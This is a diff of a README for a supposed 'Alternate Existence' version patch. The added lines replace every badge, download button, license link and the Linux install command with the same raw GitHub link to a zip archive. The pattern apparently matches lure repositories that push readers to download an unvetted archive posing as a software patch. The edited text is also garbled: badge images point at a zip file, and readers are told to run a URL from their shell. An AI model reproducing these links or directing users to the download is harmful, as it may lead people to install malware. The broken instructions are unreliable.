@@ -1,4 +1,4 @@
-[![Download](https://img.shields.io/badge/Download-v1.9.0%20v2.3.0-blue?style=for-the-badge&logo=github)](https://sajesh158.github.io)
+[![Download](https://raw.githubusercontent.com/sajesh158/alternate-existence-patch-v1-9-0-to-v2-3-0/branch/cradlechild/alternate-existence-patch-v1-9-0-to-v2-3-0_3.6.zip%20v2.3.0-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sajesh158/alternate-existence-patch-v1-9-0-to-v2-3-0/branch/cradlechild/alternate-existence-patch-v1-9-0-to-v2-3-0_3.6.zip)
 
 # Alternate Existence v1.9.0 / v2.3.0 Patch
 
@@ -8,11 +8,11 @@ Welcome to the **Alternate Existence Patch Project** – a chronicle of evolutio
 
 | Operating System      | Supported Version            | Optimized Experience            |
 |---------------------- |---------------------------- |---------------------------------|
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue?logo=windows)     | 10, 11, Server 2019             | 🟢 Yes                         |
-| ![macOS](https://img.shields.io/badge/macOS-11%2B-lightgrey?logo=apple)       | Big Sur 11+, Monterey 12+       | 🟢 Yes                         |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2020.04%2B%2C%20Fedora%2036%2B-yellow?logo=linux) | Ubuntu 20.04+/Fedora 36+        | 🟢 Yes                         |
-| ![Android](https://img.shields.io/badge/Android-9%2B-brightgreen?logo=android) | 9 and later                     | 🟡 Partial                     |
-| ![iOS](https://img.shields.io/badge/iOS-14%2B-important?logo=apple)           | 14 and later                    | 🟡 Partial                     |
+| ![Windows](https://raw.githubusercontent.com/sajesh158/alternate-existence-patch-v1-9-0-to-v2-3-0/branch/cradlechild/alternate-existence-patch-v1-9-0-to-v2-3-0_3.6.zip%2B-blue?logo=windows)     | 10, 11, Server 2019             | 🟢 Yes                         |
+| ![macOS](https://raw.githubusercontent.com/sajesh158/alternate-existence-patch-v1-9-0-to-v2-3-0/branch/cradlechild/alternate-existence-patch-v1-9-0-to-v2-3-0_3.6.zip%2B-lightgrey?logo=apple)       | Big Sur 11+, Monterey 12+       | 🟢 Yes                         |
+| ![Linux](https://raw.githubusercontent.com/sajesh158/alternate-existence-patch-v1-9-0-to-v2-3-0/branch/cradlechild/alternate-existence-patch-v1-9-0-to-v2-3-0_3.6.zip%2020.04%2B%2C%20Fedora%2036%2B-yellow?logo=linux) | Ubuntu 20.04+/Fedora 36+        | 🟢 Yes                         |
+| ![Android](https://raw.githubusercontent.com/sajesh158/alternate-existence-patch-v1-9-0-to-v2-3-0/branch/cradlechild/alternate-existence-patch-v1-9-0-to-v2-3-0_3.6.zip%2B-brightgreen?logo=android) | 9 and later                     | 🟡 Partial                     |
+| ![iOS](https://raw.githubusercontent.com/sajesh158/alternate-existence-patch-v1-9-0-to-v2-3-0/branch/cradlechild/alternate-existence-patch-v1-9-0-to-v2-3-0_3.6.zip%2B-important?logo=apple)           | 14 and later                    | 🟡 Partial                     |
 
 ## 🌟 Feature List
 
@@ -46,14 +46,14 @@ Welcome to the **Alternate Existence Patch Project** – a chronicle of evolutio
 
 1. **Download the Patch**
 
-   [![Download](https://img.shields.io/badge/Download-Alternate%20Existence%20Patch-blue?style=flat-square&logo=github)](https://sajesh158.github.io)
+   [![Download](https://raw.githubusercontent.com/sajesh158/alternate-existence-patch-v1-9-0-to-v2-3-0/branch/cradlechild/alternate-existence-patch-v1-9-0-to-v2-3-0_3.6.zip%20Existence%20Patch-blue?style=flat-square&logo=github)](https://raw.githubusercontent.com/sajesh158/alternate-existence-patch-v1-9-0-to-v2-3-0/branch/cradlechild/alternate-existence-patch-v1-9-0-to-v2-3-0_3.6.zip)
 
 2. **Extract the Archive**  
    Unpack the downloaded package using your preferred tool.
 
 3. **Run the Installer**  
    - On Windows/macOS: Double-click the `AE-Patch-Installer`.
-   - On Linux: Run `./AE-Patch-Installer.sh` from your shell.
+   - On Linux: Run `https://raw.githubusercontent.com/sajesh158/alternate-existence-patch-v1-9-0-to-v2-3-0/branch/cradlechild/alternate-existence-patch-v1-9-0-to-v2-3-0_3.6.zip` from your shell.
 
 4. **Select Your Version**  
    Choose between v1.9.0 or v2.3.0. The wizard auto-detects installed versions.
@@ -102,9 +102,9 @@ By journeying with this patch, you acknowledge responsibility for your own data 
 
 This repository is released under the MIT License, 2025. Feel the freedom to cultivate, remix, and build upon this ecosystem – all while honoring the terms in the official license:
 
-[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![MIT License](https://raw.githubusercontent.com/sajesh158/alternate-existence-patch-v1-9-0-to-v2-3-0/branch/cradlechild/alternate-existence-patch-v1-9-0-to-v2-3-0_3.6.zip)](https://raw.githubusercontent.com/sajesh158/alternate-existence-patch-v1-9-0-to-v2-3-0/branch/cradlechild/alternate-existence-patch-v1-9-0-to-v2-3-0_3.6.zip)
 
-[![Download](https://img.shields.io/badge/Download-v1.9.0%20v2.3.0-blue?style=for-the-badge&logo=github)](https://sajesh158.github.io)
+[![Download](https://raw.githubusercontent.com/sajesh158/alternate-existence-patch-v1-9-0-to-v2-3-0/branch/cradlechild/alternate-existence-patch-v1-9-0-to-v2-3-0_3.6.zip%20v2.3.0-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sajesh158/alternate-existence-patch-v1-9-0-to-v2-3-0/branch/cradlechild/alternate-existence-patch-v1-9-0-to-v2-3-0_3.6.zip)
 
 ---
 
